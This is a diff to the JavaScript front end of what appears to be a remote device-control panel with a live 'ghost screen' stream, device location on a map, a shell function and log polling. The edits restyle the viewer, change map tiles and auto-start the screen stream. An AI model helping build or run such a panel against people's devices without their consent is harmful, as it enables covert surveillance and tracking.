@@ -718,25 +718,33 @@ function executeShell() {
 // Ghost Screen Controls with Smooth Touch and Viewport Scaling
 function enforceGhostViewportScaling() {
   const streamImg = document.getElementById("ghost-screen-stream");
+  const phoneFrame = document.querySelector(".phone-frame");
   if (streamImg) {
     streamImg.style.width = "100%";
-    streamImg.style.maxWidth = "360px";
-    streamImg.style.height = "auto";
-    streamImg.style.maxHeight = "70vh";
-    streamImg.style.objectFit = "contain";
+    streamImg.style.height = "100%";
+    streamImg.style.objectFit = "fill";
     streamImg.style.display = "block";
-    streamImg.style.margin = "0 auto";
-    streamImg.style.borderRadius = "12px";
+    streamImg.style.borderRadius = "20px";
     streamImg.style.touchAction = "none";
     streamImg.style.webkitUserSelect = "none";
     streamImg.style.userSelect = "none";
 
-    const parent = streamImg.parentElement;
-    if (parent) {
-      parent.style.maxWidth = "100%";
-      parent.style.boxSizing = "border-box";
-      parent.style.overflow = "hidden";
-      parent.style.touchAction = "none";
+    if (phoneFrame) {
+      if (streamImg.naturalWidth && streamImg.naturalHeight) {
+        const aspectRatio = streamImg.naturalHeight / streamImg.naturalWidth;
+        const baseWidth = 280;
+        const calculatedScreenHeight = Math.round(baseWidth * aspectRatio);
+        phoneFrame.style.width = baseWidth + "px";
+        phoneFrame.style.height = calculatedScreenHeight + "px";
+      } else {
+        phoneFrame.style.width = "280px";
+        phoneFrame.style.height = "560px";
+      }
+      phoneFrame.style.maxWidth = "100%";
+      phoneFrame.style.boxSizing = "border-box";
+      phoneFrame.style.overflow = "hidden";
+      phoneFrame.style.position = "relative";
+      phoneFrame.style.touchAction = "none";
     }
 
     if (!streamImg.dataset.touchInitialized) {
@@ -1565,7 +1573,7 @@ function locateDevice() {
         const extMapBtn = document.getElementById("ext-map-btn");
 
         if (mapFrame) {
-          mapFrame.srcdoc = `<!DOCTYPE html><html><head><meta name="referrer" content="no-referrer"/><link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/><script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script><style>html,body,#map{height:100%;margin:0;padding:0;background:#02080d;}.red-pin{background-color:#ff0033;width:16px;height:16px;border-radius:50%;border:2px solid #ffffff;box-shadow:0 0 12px #ff0033, 0 0 24px #ff0033;animation:pulse 1.5s infinite;margin-left:-8px;margin-top:-8px;}@keyframes pulse{0%{box-shadow:0 0 0 0 rgba(255,0,51,0.8);}70%{box-shadow:0 0 0 15px rgba(255,0,51,0);}100%{box-shadow:0 0 0 0 rgba(255,0,51,0);}}</style></head><body><div id="map"></div><script>var m=L.map('map',{zoomControl:false}).setView([${data.lat},${data.lon}],15);var tile1=L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png',{maxZoom:19,subdomains:'abcd'});tile1.on('tileerror',function(){L.tileLayer('https://server.arcgisonline.com/ArcGIS/rest/services/World_Imagery/MapServer/tile/{z}/{y}/{x}').addTo(m);});tile1.addTo(m);var redIcon=L.divIcon({className:'custom-red-pin',html:'<div class="red-pin"></div>'});L.marker([${data.lat},${data.lon}],{icon:redIcon}).addTo(m);</script></body></html>`;
+          mapFrame.srcdoc = `<!DOCTYPE html><html><head><meta name="referrer" content="no-referrer"/><link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/><script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script><style>html,body,#map{height:100%;margin:0;padding:0;background:#111;}.red-pin{background-color:#ff0033;width:16px;height:16px;border-radius:50%;border:2px solid #ffffff;box-shadow:0 0 12px #ff0033, 0 0 24px #ff0033;animation:pulse 1.5s infinite;margin-left:-8px;margin-top:-8px;}@keyframes pulse{0%{box-shadow:0 0 0 0 rgba(255,0,51,0.8);}70%{box-shadow:0 0 0 15px rgba(255,0,51,0);}100%{box-shadow:0 0 0 0 rgba(255,0,51,0);}}</style></head><body><div id="map"></div><script>var m=L.map('map',{zoomControl:false}).setView([${data.lat},${data.lon}],15);L.tileLayer('https://maps.wikimedia.org/osm-intl/{z}/{x}/{y}.png',{maxZoom:19,attribution:'Wikimedia'}).addTo(m);var redIcon=L.divIcon({className:'custom-red-pin',html:'<div class="red-pin"></div>'});L.marker([${data.lat},${data.lon}],{icon:redIcon}).addTo(m);</script></body></html>`;
           mapFrame.style.display = "block";
         }
         if (mapOverlay) mapOverlay.style.display = "none";
@@ -1842,6 +1850,7 @@ document.addEventListener("DOMContentLoaded", () => {
   if (document.getElementById("ghost-status-card") || document.getElementById("ghost-screen-stream")) {
     checkGhostStatus();
     refreshGhostLogs();
+    startGhostScreen();
     setInterval(checkGhostStatus, 2000);
     setInterval(refreshGhostLogs, 2000);
   }
